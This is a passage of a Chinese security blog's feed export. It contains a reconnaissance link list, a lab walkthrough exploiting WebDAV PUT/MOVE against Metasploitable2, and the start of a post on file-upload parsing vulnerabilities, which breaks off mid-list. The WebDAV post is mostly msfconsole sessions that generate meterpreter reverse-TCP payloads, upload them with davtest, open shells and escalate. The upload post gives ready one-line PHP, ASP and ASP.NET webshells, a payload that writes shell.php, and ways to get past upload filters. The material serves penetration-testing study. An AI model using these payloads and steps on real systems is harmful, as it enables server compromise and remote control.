rel="noopener">http://www.test.com/robots.txt</a></li><li>审查元素-通过浏览器对网页的元素进行审查，google浏览器通过F12进行打开，建议使用firefox的firebug工具进行元素的审查。</li></ul></li></ul></li></ul><hr><ul><li><p>利用浏览器进行信息收集,熟练使用搜索语法</p><ul><li><a href="https://www.google.com/" target="_blank" rel="noopener">google</a><ul><li><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">Google GHDB</a></li><li><a href="https://www.ytyzx.org/index.php?title=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Google%EF%BC%88%E8%B0%B7%E6%AD%8C%EF%BC%89%E8%BF%9B%E8%A1%8C%E9%AB%98%E6%95%88%E7%8E%87%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">如何使用Google（谷歌）进行高效率搜索</a></li><li><a href="https://www.zhihu.com/question/20161362" target="_blank" rel="noopener">如何用好谷歌等搜索引擎？</a></li></ul></li><li><a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a><ul><li><a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Schearer/DEFCON-18-Schearer-SHODAN.pdf" target="_blank" rel="noopener">shodan使用指南</a></li><li><a href="https://leanpub.com/shodan" target="_blank" rel="noopener">Complete Guide to Shodan</a>-<code>链接：https://pan.baidu.com/s/1bpyeKqV 密码：3cwk</code></li></ul></li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a><ul><li><a href="https://www.zoomeye.org/help" target="_blank" rel="noopener">zoomeye帮助手册</a></li></ul></li></ul></li><li><p>辅助工具</p><ul><li><a href="http://tool.oschina.net/" target="_blank" rel="noopener">http://tool.oschina.net/</a></li><li><a href="https://tool.lu/" target="_blank" rel="noopener">https://tool.lu/</a></li><li><a href="http://www.yopmail.com/zh/" target="_blank" rel="noopener">临时邮箱</a></li><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a></li></ul></li><li>辅助资料<ul><li><a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="noopener">渗透标准</a></li></ul></li></ul><p>参考：</p><p><a href="http://www.cnnetarmy.com/%E4%B9%99%E6%96%B9%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">乙方渗透测试之信息收集</a></p><p><a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">EK</a></p><p><a href="https://www.owasp.org/index.php/Testing:_Information_Gathering" target="_blank" rel="noopener">Testing:_Information_Gathering</a></p><p><a href="https://github.com/jivoi/awesome-osint" target="_blank" rel="noopener">Awesome OSINT</a></p><hr><p>[首页图来自wallhaven.cc][5]</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web安全信息收集&quot;&gt;&lt;a href=&quot;#web安全信息收集&quot; class=&quot;headerlink&quot; title=&quot;web安全信息收集&quot;&gt;&lt;/a&gt;web安全信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1515035737450.jpg&quot; alt=&quot;web安全信息收集&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="web信息收集" scheme="http://airs-sec.com/tags/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>危险的http请求方法webdav-metasploit获取session</title>
    <link href="http://airs-sec.com/2017/12/18/%E5%8D%B1%E9%99%A9%E7%9A%84http%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95webdav-metasploit%E8%8E%B7%E5%8F%96session/"/>
    <id>http://airs-sec.com/2017/12/18/危险的http请求方法webdav-metasploit获取session/</id>
    <published>2017-12-18T02:47:04.000Z</published>
    <updated>2017-12-18T03:51:48.606Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513569024727.jpg" alt="危险的http请求方法"></p><a id="more"></a><h1 id="HTTP请求方法简介"><a href="#HTTP请求方法简介" class="headerlink" title="HTTP请求方法简介"></a>HTTP请求方法简介</h1><p>HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：</p><p><strong>OPTIONS：</strong>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。<code>用&#39;*&#39;来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</code></p><p><strong>HEAD：</strong>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p><p><strong>GET：</strong>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。</p><p><strong>POST：</strong>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p><p><strong>PUT：</strong>向指定资源位置上传其最新内容。</p><p><strong>DELETE：</strong>请求服务器删除Request-URI所标识的资源。</p><p><strong>TRACE：</strong>回显服务器收到的请求，主要用于测试或诊断。</p><p><strong>CONNECT：</strong>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。</p><blockquote><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</p></blockquote><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。</p><p>若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。</p><h2 id="burpsuite抓包上传"><a href="#burpsuite抓包上传" class="headerlink" title="burpsuite抓包上传"></a>burpsuite抓包上传</h2><p>通过burpsuite改变请求方法获取服务器开启的请求方法</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566205639.jpg" alt="1"></p><ol start="2"><li><p>利用PUT方法将文件上传到服务器上。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566254484.jpg" alt="2"></p></li></ol><p> 3.上传成功后，可以通过MOVE请求方法，将txt文本move成可执行脚本</p><p> 4.浏览器验证</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566339195.jpg" alt="3"></p><h2 id="利用davtest上传文件至dav目录"><a href="#利用davtest上传文件至dav目录" class="headerlink" title="利用davtest上传文件至dav目录"></a>利用davtest上传文件至dav目录</h2><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566391714.jpg" alt="4"></p><p>上传成功。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513566408438.jpg" alt="5"></p><h2 id="Metasploit通过webdava方法获取session"><a href="#Metasploit通过webdava方法获取session" class="headerlink" title="Metasploit通过webdava方法获取session"></a>Metasploit通过webdava方法获取session</h2><p><strong>环境：</strong></p><p><code>kali</code></p><p><code>metasploitable2</code></p><p>1、查看攻击机kali的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">查看本地ip地址</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; ifconfig</span><br><span class="line">[*] exec: ifconfig</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:4b:99:df  </span><br><span class="line">          inet addr:192.168.179.128  Bcast:192.168.179.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe4b:99df/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:4274321 errors:5690 dropped:278 overruns:0 frame:0</span><br><span class="line">          TX packets:12392315 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:448370315 (427.5 MiB)  TX bytes:769015699 (733.3 MiB)</span><br><span class="line">          Interrupt:19 Base address:0x2000 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:4589317 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:4589317 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:480528935 (458.2 MiB)  TX bytes:480528935 (458.2 MiB)</span><br></pre></td></tr></table></figure><p>2、开启metasploit</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/webdav_website_content</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/webdav_website_content):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   PATH     /                yes       Path to use</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT    80               yes       The target port</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf auxiliary(webdav_website_content) &gt; setg RHOST 192.168.179.129</span><br><span class="line">RHOST =&gt; 192.168.179.129</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; set PATH /dav/</span><br><span class="line">PATH =&gt; /dav/</span><br><span class="line">msf auxiliary(webdav_website_content) &gt; use payload/php/meterpreter/reverse_tcp</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   </span><br><span class="line">msf payload(reverse_tcp) &gt; set LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf payload(reverse_tcp) &gt; set LPORT 4321</span><br><span class="line">LPORT =&gt; 4321</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT  4321             yes       The listen port</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成攻击脚本</span></span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; generate -t raw -f testmeter.php</span><br><span class="line">[*] Writing 951 bytes to testmeter.php...</span><br></pre></td></tr></table></figure><p>3、kaili开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; use multi/handler</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt;</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4321</span><br><span class="line">LPORT =&gt; 4321</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; run -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.179.128:4321 </span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p>4、攻击主机上传php脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.179.129/dav/ -uploadfile testmeter.php -uploadloc /DavTestDir_I3DjsKO5fx/testmeter.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.179.129/dav</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.179.129/dav//DavTestDir_I3DjsKO5fx/testmeter.php</span><br></pre></td></tr></table></figure><p>5、上传成功并点击可执行脚本获取session会话。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567102783.jpg" alt="6"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567117889.jpg" alt="sysinfo"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567129358.jpg" alt="shell"></p><h2 id="升级权限"><a href="#升级权限" class="headerlink" title="升级权限"></a>升级权限</h2><p>1、生成可以执行的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use payload/linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf payload(reverse_tcp) &gt;</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST                          yes       The listen address</span><br><span class="line">   LPORT         4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf payload(reverse_tcp) &gt; setg LHOST 192.168.179.128</span><br><span class="line">LHOST =&gt; 192.168.179.128</span><br><span class="line">msf payload(reverse_tcp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (payload/linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST         192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT         8888             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; generate -t elf -f meter.elf</span><br><span class="line">[*] Writing 155 bytes to meter.elf...</span><br><span class="line">msf payload(reverse_tcp) &gt;</span><br></pre></td></tr></table></figure><p>2、开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf payload(reverse_tcp) &gt; use multi/handler</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DebugOptions  0                no        Debugging options for POSIX meterpreter</span><br><span class="line">   LHOST         192.168.179.128  yes       The listen address</span><br><span class="line">   LPORT         4321             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.179.128:8888 </span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513567487701.jpg" alt="9"></p><p>3、通过sessions –I 1的upload命令上传meter.elf文件，从而获取到更高权限</p><p><code>upload meter.elf 上传文件</code></p><p>4、在sessions -l 1下执行shell,并执行攻击脚本，获取sessions</p><blockquote><p>shell</p></blockquote><blockquote><p>chmod +x meter.elf</p></blockquote><blockquote><p>execute –f meter.elf </p></blockquote><p>5、sessions –l,此时就有两个sessions了</p><hr><p>去年做实验总结的一篇文章，现在看时，感觉不像自己写的，但验证结果是自己做的的确没错。<code>-_-|</code></p><p>所以就发表出来了。</p><p>漏洞简介和原理是来自安全社区<code>http://www.loner.fm</code>的<code>wiki</code>，<code>wiki</code>已经访问不了了。</p><p><a href="http://obgutsg63.bkt.clouddn.com/blog/1513566391714.jpg" target="_blank" rel="noopener">首页图来自wallhaven.cc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1513569024727.jpg&quot; alt=&quot;危险的http请求方法&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全剖析-第六章-文件上传</title>
    <link href="http://airs-sec.com/2017/12/15/web%E5%AE%89%E5%85%A8%E5%89%96%E6%9E%90-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://airs-sec.com/2017/12/15/web安全剖析-第六章-文件上传/</id>
    <published>2017-12-15T09:06:02.000Z</published>
    <updated>2017-12-15T09:13:17.732Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/6b695b58a8c141161d5b9d9c39259579_r.jpg" alt="enter description here" title="文件上传"></p><a id="more"></a><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p><strong>iis解析漏洞存在两种情况：</strong></p><p>1、目录解析漏洞</p><p>当建立<code>*.asp</code>的目录时，放在这个目录下的任意文件都当作asp文件来执行。</p><p><code>/xx.asp/xx.jpg</code></p><p>2、文件后缀解析漏洞</p><p>建立一个文件为<code>*.asp;.1.jpg</code>文件时，可以当作asp文件来执行。</p><p><code>wooyun.asp;.jpg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/wooyun.asa</span><br><span class="line">/wooyun.cer</span><br><span class="line">/wooyun.cdx</span><br></pre></td></tr></table></figure><p>3、webdav扩展漏洞</p><p>当iis服务器开启了webdav扩展之后，允许客户端有更多的请求方法，如：put、delete、copy、move等请求方法。</p><p>结合这些方法，可以用put方法将txt文本上传到服务器上，之后利用copy或move方法将txt文件转成可执行文件。</p><p><code>iis write</code></p><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p>版本：apache1.x，apache2.x</p><p>apache在碰到一个文件时，如1.php.rar，这是php会从后往前对文件后缀进行解析，找到一个自己可以解析的文件后缀。</p><p>配合解析漏洞，可以将可执行文件上传到服务器上，绕过程序的检测，获取webshell。</p><h2 id="php-cgi解析漏洞（Nginx解析漏洞）"><a href="#php-cgi解析漏洞（Nginx解析漏洞）" class="headerlink" title="php cgi解析漏洞（Nginx解析漏洞）"></a>php cgi解析漏洞（Nginx解析漏洞）</h2><p><a href="http://xxx.com/1.jpg/1.php" target="_blank" rel="noopener">http://xxx.com/1.jpg/1.php</a></p><p>1.jpg为图片马</p><p>iis7.0、iis7.5、lighttpd也存在这样的漏洞。</p><p>补充：</p><p>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code>的文件，然后访问<code>wooyun.jpg/.php</code>,在这个目录下就会生成一句话木马<code>shell.php</code>。</p><p><a href="http://cb.drops.wiki/drops/papers-539.html" target="_blank" rel="noopener">传送门-解析漏洞总结</a></p><h1 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h1><ul><li>客户端检测</li><li>服务器端检测</li></ul><p><strong>中国菜刀</strong></p><p>一句话：</p><p>php</p><p><code>&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</code></p><p>asp</p><p><code>&lt;%eval request(&quot;chopper&quot;)%&gt;</code></p><p>asp.net</p><p><code>&lt;% Page Language=&quot;JScript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code></p><p>图片一句话：</p><p>将一句话木马插入在图片文件中，而且并不损坏图片文件。</p><p><code>edjpgcom</code></p><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><blockquote><p>在服务器后端缺乏对于用户输入的处理和限制或者处理和限制不严格。</p></blockquote><p>1、firebug删除js</p><p>2、burpsuite改文件后缀名</p><h2 id="服务器端检测"><a href="#服务器端检测" class="headerlink" title="服务器端检测"></a>服务器端检测</h2><ol><li>黑名单过滤</li></ol><p>黑名单过滤是一种不安全的方式，黑名单定义了一系列的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现文件扩展名与黑名单的扩展名匹配，则认为文件不合法。</p><p>在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动去除“.”与空格，如：<code>asp.</code>或者<code>asp_</code></p><ol start="2"><li>白名单过滤</li></ol><p>配合解析漏洞进行绕过</p><ol start="3"><li>MIME验证</li></ol><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p><strong>按照内容类型排列的 Mime 类型列表</strong><br>|类型/子类型    | 扩展名 |<br>|—-|—-|<br>|application/msword    |doc|<br>|application/octet-stream|    exe|<br>|application/pdf|    pdf|<br>|application/rtf|    rtf|<br>|application/vnd.ms-powerpoint    |ppt|<br>|application/x-javascript    |js|<br>|application/x-shockwave-flash    |swf|<br>|application/zip|    zip|<br>|application/php|php文件|<br>|audio/mpeg    |mp3|<br>|audio/x-wav    |wav|<br>|image/bmp    |bmp|<br>|image/gif    |gif|<br>|image/jpeg    |jpeg|<br>|image/jpeg|    jpg|<br>|text/css    |css|<br>|text/html    |html|<br>|text/plain|    txt|</p><p>在http请求中，MIME类型放在Content-Type字段</p><ol 